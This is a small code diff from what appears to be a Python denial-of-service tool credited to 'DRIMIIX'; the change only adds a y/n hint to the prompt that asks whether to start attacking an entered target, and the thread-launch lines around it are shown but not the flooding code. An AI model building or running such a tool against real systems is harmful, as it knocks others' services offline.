@@ -106,7 +106,7 @@ DDos-Made by DRIMIIX
 """)
     target = input("/ENTER YOUR FULL TARGET/: ")
     print("/TARGET VERFIED/")
-    ans = input("/DO YOU WANT TO START ATTACKING?/")
+    ans = input("/DO YOU WANT TO START ATTACKING?y[y or n]/")
     if ans.startswith("y"):
         print("/STARTING TO ATTACK/")
         t1 = threading.Thread(target=RunThread)
